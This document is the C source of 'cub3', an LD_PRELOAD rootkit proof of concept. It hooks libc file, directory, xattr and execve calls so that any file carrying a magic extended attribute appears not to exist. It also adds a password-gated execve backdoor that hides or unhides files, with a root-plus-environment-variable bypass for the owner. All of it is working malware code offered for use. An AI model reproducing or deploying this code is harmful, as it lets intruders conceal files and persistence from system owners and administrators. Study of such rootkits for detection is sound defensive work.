/*
 *
 *  ██████╗██╗   ██╗██████╗ ██████╗ 
 * ██╔════╝██║   ██║██╔══██╗╚════██╗
 * ██║     ██║   ██║██████╔╝ █████╔╝
 * ██║     ██║   ██║██╔══██╗ ╚═══██╗
 * ╚██████╗╚██████╔╝██████╔╝██████╔╝
 *  ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝ 
 *
 *  Small proof of concept to show
 *  how extended attributes can be
 *  utilised to protect files in
 *  LD_PRELOAD malware.
 *
 *  More information and
 *  installation instructions
 *  available in README.md
 *
 *  Contact me (email):
 *    xor@cock.lu
 *
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <dlfcn.h>

#include <sys/xattr.h> // xattr is abbreviated version of extended attributes. basically the heart and soul of cub3 :)
#include <sys/types.h>
#include <sys/stat.h>

#include "config.h"

// main functions of this poc. checks if the file is protected by the magic xattr string
int hidden_xattr(const char *file);
int hidden_fxattr(int fd);

// allows for removal of cub3 after you're done playing around with it. just requires root and set env var
int rm_shell(void);

// old_<symbol name> functions. allows for callback to original libc functions
// xattr stuff
// list
ssize_t (*old_listxattr)(const char *path, char *list, size_t size);
ssize_t (*old_llistxattr)(const char *path, char *list, size_t size);
ssize_t (*old_flistxattr)(int fd, char *list, size_t size);
// get
ssize_t (*old_getxattr)(const char *path, const char *name, void *value, size_t size);
ssize_t (*old_lgetxattr)(const char *path, const char *name, void *value, size_t size);
ssize_t (*old_fgetxattr)(int fd, const char *name, void *value, size_t size);
// set
int (*old_setxattr)(const char *path, const char *name, const void *value, size_t size, int flags);
int (*old_lsetxattr)(const char *path, const char *name, const void *value, size_t size, int flags);
int (*old_fsetxattr)(int fd, const char *name, const void *value, size_t size, int flags);
// remove
int (*old_removexattr)(const char *path, const char *name);
int (*old_lremovexattr)(const char *path, const char *name);
int (*old_fremovexattr)(int fd, const char *name);

// open() stuff
int (*old_open)(const char *pathname, int flags, mode_t mode);
int (*old_open64)(const char *pathname, int flags, mode_t mode);
int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
int (*old_creat)(const char *pathname, mode_t mode);

// unlink() stuff
int (*old_unlink)(const char *pathname);
int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
int (*old_rmdir)(const char *pathname);

// symlink() stuff
int (*old_symlink)(const char *target, const char *linkpath);
int (*old_symlinkat)(const char *target, int newdirfd, const char *linkpath);

// directory stuff
int (*old_mkdir)(const char *pathname, mode_t mode);
int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
int (*old_chdir)(const char *path);
int (*old_fchdir)(int fd);
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
DIR *(*old_fdopendir)(int fd);
struct dirent *(*old_readdir)(DIR *dirp);
struct dirent64 *(*old_readdir64)(DIR *dirp);

// hooking execve() so we can dynamically hide/unhide files/directories
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);

int hidden_xattr(const char *file)
{
    #ifdef DEBUG
        printf("[cub3]: hidden_xattr() called\n");
        printf("[cub3]: going to attempt to distinguish visibility of file %s\n", file);
    #endif

    ssize_t buflen, keylen;
    char *buf, *key;

    if(!old_listxattr) old_listxattr = dlsym(RTLD_NEXT, "listxattr");

    if((buflen = old_listxattr(file, NULL, 0)) == -1)
    {
        return 0;
    }else if(buflen == 0){
        return buflen;
    }

    buf = malloc(buflen);
    if((buflen = old_listxattr(file, buf, buflen)) == -1) return 0; // fuuuck

    key = buf;

    while(buflen > 0)
    {
        if(strstr(key, HIDDEN_XATTR_STR))
        {
            #ifdef DEBUG
                printf("[cub3]: file %s is protected with extended attributes\n", file);
            #endif

            free(buf); return 1; // don't bother loading the next attribute.. no point lol
        }

        keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
    }

    free(buf); return 0; // nothing came up.. this makes us sad :(
}

int hidden_fxattr(int fd)
{
    #ifdef DEBUG
        printf("[cub3]: hidden_fxattr() called\n");
        printf("[cub3]: going to attempt to distinguish visiblity of fd %d\n", fd);
    #endif

    ssize_t buflen, keylen;
    char *buf, *key;

    if(!old_flistxattr) old_flistxattr = dlsym(RTLD_NEXT, "flistxattr");

    if((buflen = old_flistxattr(fd, NULL, 0)) == -1)
    {
        return 0;
    }else if(buflen == 0){
        return buflen;
    }

    buf = malloc(buflen);
    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) return 0;

    key = buf;

    while(buflen > 0)
    {
        if(strstr(key, HIDDEN_XATTR_STR))
        {
            #ifdef DEBUG
                printf("[cub3]: fd %d is protected with extended attributes\n", fd);
            #endif

            free(buf); return 1;
        }

        keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
    }

    free(buf); return 0;
}

int rm_shell(void)
{
    #ifdef DEBUG
        printf("[cub3]: rm_shell() called\n");
    #endif

    if(getuid() == 0 && getenv(OWNER_ENV_VAR)) return 1;
    return 0;
}

// now let's start writing our hooked functions :)

ssize_t listxattr(const char *path, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: listxattr() called\n");
    #endif

    if(!old_listxattr) old_listxattr = dlsym(RTLD_NEXT, "listxattr");

    if(rm_shell()) return old_listxattr(path, list, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_listxattr(path, list, size);
}

ssize_t llistxattr(const char *path, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: llistxattr() called\n");
    #endif

    if(!old_llistxattr) old_llistxattr = dlsym(RTLD_NEXT, "llistxattr");

    if(rm_shell()) return old_llistxattr(path, list, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_llistxattr(path, list, size);
}

ssize_t flistxattr(int fd, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: flistxattr() called\n");
    #endif

    if(!old_flistxattr) old_flistxattr = dlsym(RTLD_NEXT, "flistxattr");

    if(rm_shell()) return old_flistxattr(fd, list, size);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_flistxattr(fd, list, size);
}

ssize_t getxattr(const char *path, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: getxattr() called\n");
    #endif

    if(!old_getxattr) old_getxattr = dlsym(RTLD_NEXT, "getxattr");

    if(rm_shell()) return old_getxattr(path, name, value, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_getxattr(path, name, value, size);
}

ssize_t lgetxattr(const char *path, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: lgetxattr() called\n");
    #endif

    if(!old_lgetxattr) old_lgetxattr = dlsym(RTLD_NEXT, "lgetxattr");

    if(rm_shell()) return old_lgetxattr(path, name, value, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_lgetxattr(path, name, value, size);
}

ssize_t fgetxattr(int fd, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[cub3]: fgetxattr() called\n");
    #endif

    if(!old_fgetxattr) old_fgetxattr = dlsym(RTLD_NEXT, "fgetxattr");

    if(rm_shell()) return old_fgetxattr(fd, name, value, size);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fgetxattr(fd, name, value, size);
}

int setxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[cub3]: setxattr() called\n");
    #endif

    if(!old_setxattr) old_setxattr = dlsym(RTLD_NEXT, "setxattr");

    if(rm_shell()) return old_setxattr(path, name, value, size, flags);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_setxattr(path, name, value, size, flags);
}

int lsetxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[cub3]: lsetxattr() called\n");
    #endif

    if(!old_lsetxattr) old_lsetxattr = dlsym(RTLD_NEXT, "lsetxattr");

    if(rm_shell()) return old_lsetxattr(path, name, value, size, flags);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_lsetxattr(path, name, value, size, flags);
}

int fsetxattr(int fd, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[cub3]: fsetxattr() called\n");
    #endif

    if(!old_fsetxattr) old_fsetxattr = dlsym(RTLD_NEXT, "fsetxattr");

    if(rm_shell()) return old_fsetxattr(fd, name, value, size, flags);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fsetxattr(fd, name, value, size, flags);
}

int removexattr(const char *path, const char *name)
{
    #ifdef DEBUG
        printf("[cub3]: removexattr() called\n");
    #endif

    if(!old_removexattr) old_removexattr = dlsym(RTLD_NEXT, "removexattr");

    if(rm_shell()) return old_removexattr(path, name);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_removexattr(path, name);
}

int lremovexattr(const char *path, const char *name)
{
    #ifdef DEBUG
        printf("[cub3]: lremovexattr() called\n");
    #endif

    if(!old_lremovexattr) old_lremovexattr = dlsym(RTLD_NEXT, "lremovexattr");

    if(rm_shell()) return old_lremovexattr(path, name);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_lremovexattr(path, name);
}

int fremovexattr(int fd, const char *name)
{
    #ifdef DEBUG
        printf("[cub3]: fremovexattr() called\n");
    #endif

    if(!old_fremovexattr) old_fremovexattr = dlsym(RTLD_NEXT, "fremovexattr");

    if(rm_shell()) return old_fremovexattr(fd, name);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fremovexattr(fd, name);
}

int open(const char *pathname, int flags, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: open() called\n");
    #endif

    if(!old_open) old_open = dlsym(RTLD_NEXT, "open");

    if(rm_shell()) return old_open(pathname, flags, mode);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: open64() called\n");
    #endif

    if(!old_open64) old_open64 = dlsym(RTLD_NEXT, "open64");

    if(rm_shell()) return old_open64(pathname, flags, mode);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_open64(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: openat() called\n");
    #endif

    if(!old_openat) old_openat = dlsym(RTLD_NEXT, "openat");

    if(rm_shell()) return old_openat(dirfd, pathname, flags, mode);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }

    return old_openat(dirfd, pathname, flags, mode);
}

int creat(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: creat() called\n");
    #endif

    if(!old_creat) old_creat = dlsym(RTLD_NEXT, "creat");

    if(rm_shell()) return old_creat(pathname, mode);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_creat(pathname, mode);
}

int unlink(const char *pathname)
{
    #ifdef DEBUG
        printf("[cub3]: unlink() called\n");
    #endif

    if(!old_unlink) old_unlink = dlsym(RTLD_NEXT, "unlink");

    if(rm_shell()) return old_unlink(pathname);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
    #ifdef DEBUG
        printf("[cub3]: unlinkat() called\n");
    #endif

    if(!old_unlinkat) old_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

    if(rm_shell()) return old_unlinkat(dirfd, pathname, flags);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }

    return old_unlinkat(dirfd, pathname, flags);
}

int rmdir(const char *pathname)
{
    #ifdef DEBUG
        printf("[cub3]: rmdir() called\n");
    #endif

    if(!old_rmdir) old_rmdir = dlsym(RTLD_NEXT, "rmdir");

    if(rm_shell()) return old_rmdir(pathname);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_rmdir(pathname);
}

int symlink(const char *target, const char *linkpath)
{
    #ifdef DEBUG
        printf("[cub3]: symlink() called\n");
    #endif

    if(!old_symlink) old_symlink = dlsym(RTLD_NEXT, "symlink");

    if(rm_shell()) return old_symlink(target, linkpath);

    if(hidden_xattr(target) || hidden_xattr(linkpath)) { errno = ENOENT; return -1; }

    return old_symlink(target, linkpath);
}

int symlinkat(const char *target, int newdirfd, const char *linkpath)
{
    #ifdef DEBUG
        printf("[cub3]: symlinkat() called\n");
    #endif

    if(!old_symlinkat) old_symlinkat = dlsym(RTLD_NEXT, "symlinkat");

    if(rm_shell()) return old_symlinkat(target, newdirfd, linkpath);

    if(hidden_xattr(target) ||
       hidden_xattr(linkpath) ||
       hidden_fxattr(newdirfd))
    { errno = ENOENT; return -1;}

    return old_symlinkat(target, newdirfd, linkpath);
}

int mkdir(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: mkdir() called\n");
    #endif

    if(!old_mkdir) old_mkdir = dlsym(RTLD_NEXT, "mkdir");

    if(rm_shell()) return old_mkdir(pathname, mode);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_mkdir(pathname, mode);
}

int mkdirat(int dirfd, const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[cub3]: mkdirat() called\n");
    #endif

    if(!old_mkdirat) old_mkdirat = dlsym(RTLD_NEXT, "mkdirat");

    if(rm_shell()) return old_mkdirat(dirfd, pathname, mode);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }

    return old_mkdirat(dirfd, pathname, mode);
}

int chdir(const char *path)
{
    #ifdef DEBUG
        printf("[cub3]: chdir() called\n");
    #endif

    if(!old_chdir) old_chdir = dlsym(RTLD_NEXT, "chdir");

    if(rm_shell()) return old_chdir(path);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_chdir(path);
}

int fchdir(int fd)
{
    #ifdef DEBUG
        printf("[cub3]: fchdir() called\n");
    #endif

    if(!old_fchdir) old_fchdir = dlsym(RTLD_NEXT, "fchdir");

    if(rm_shell()) return fchdir(fd);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fchdir(fd);
}

DIR *opendir(const char *name)
{
    #ifdef DEBUG
        printf("[cub3]: opendir() called\n");
    #endif

    if(!old_opendir) old_opendir = dlsym(RTLD_NEXT, "opendir");

    if(rm_shell()) return old_opendir(name);

    if(hidden_xattr(name)) { errno = ENOENT; return NULL; }

    return old_opendir(name);
}

DIR *opendir64(const char *name)
{
    #ifdef DEBUG
        printf("[cub3]: opendir64() called\n");
    #endif

    if(!old_opendir64) old_opendir64 = dlsym(RTLD_NEXT, "opendir64");

    if(rm_shell()) return old_opendir64(name);

    if(hidden_xattr(name)) { errno = ENOENT; return NULL; }

    return old_opendir64(name);
}

DIR *fdopendir(int fd)
{
    #ifdef DEBUG
        printf("[cub3]: fdopendir() called\n");
    #endif

    if(!old_fdopendir) old_fdopendir = dlsym(RTLD_NEXT, "fdopendir");

    if(rm_shell()) return old_fdopendir(fd);

    if(hidden_fxattr(fd)) { errno = ENOENT; return NULL; }

    return old_fdopendir(fd);
}

struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
        printf("[cub3]: readdir() called\n");
    #endif

    if(!old_readdir) old_readdir = dlsym(RTLD_NEXT, "readdir");

    if(rm_shell()) return old_readdir(dirp);

    struct dirent *dir;
    char path[PATH_MAX + 1];

    do {
        dir = old_readdir(dirp);

        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;

        if(dir != NULL)
        {
            int fd = dirfd(dirp);
            char fd_path[256], *directory_name = (char *) malloc(256);
            memset(directory_name, 0, 256);
            snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
            readlink(fd_path, directory_name, 255);
            snprintf(path, sizeof(path) - 1, "%s/%s", directory_name, dir->d_name);
        }
    } while(dir && hidden_xattr(path));

    return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
    #ifdef DEBUG
        printf("[cub3]: readdir64() called\n");
    #endif

    if(!old_readdir64) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    if(rm_shell()) return old_readdir64(dirp);

    struct dirent64 *dir;
    char path[PATH_MAX + 1];

    do {
        dir = old_readdir64(dirp);

        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;

        if(dir != NULL)
        {
            int fd = dirfd(dirp);
            char fd_path[256], *directory_name = (char *) malloc(256);
            memset(directory_name, 0, 256);
            snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
            readlink(fd_path, directory_name, 255);
            snprintf(path, sizeof(path) - 1, "%s/%s", directory_name, dir->d_name);
        }
    } while(dir && hidden_xattr(path));

    return dir;
}

int execve(const char *filename, char *const argv[], char *const envp[])
{
    #ifdef DEBUG
        printf("[cub3]: execve() called\n");
    #endif

    if(!old_execve) old_execve = dlsym(RTLD_NEXT, "execve");

    if(rm_shell())
    {
        if(argv[1] != NULL && !strcmp(argv[1], EXECVE_PASS))
        {
            #ifdef DEBUG
                printf("[cub3]: user passed the CORRECT execve pass\n");
            #endif

            if(!old_setxattr) old_setxattr = dlsym(RTLD_NEXT, "setxattr");
            if(!old_removexattr) old_removexattr = dlsym(RTLD_NEXT, "removexattr");

            if(strstr(filename, "unhide"))
            {
                if(argv[2] == NULL)
                {
                    printf("Usage: ./unhide <pass> <filename>\n");
                    exit(0);
                }

                char *target_file = argv[2], xattr_user[40];
                snprintf(xattr_user, sizeof(xattr_user), "user.%s", HIDDEN_XATTR_STR);
                old_removexattr(target_file, xattr_user);
                printf("File %s unhidden.\n", target_file);

                exit(0);
            }

            if(strstr(filename, "hide"))
            {
                if(argv[2] == NULL)
                {
                    printf("Usage: ./hide <pass> <filename>\n");
                    exit(0);
                }

                char *target_file = argv[2], xattr_user[40];
                snprintf(xattr_user, sizeof(xattr_user), "user.%s", HIDDEN_XATTR_STR);
                old_setxattr(target_file, xattr_user, HIDDEN_XATTR_STR, strlen(HIDDEN_XATTR_STR), XATTR_CREATE);
                printf("File %s hidden.\n", target_file);

                exit(0);
            }
        }

        return old_execve(filename, argv, envp);
    }

    if(hidden_xattr(filename)) { errno = ENOENT; return -1; }

    return old_execve(filename, argv, envp);
}
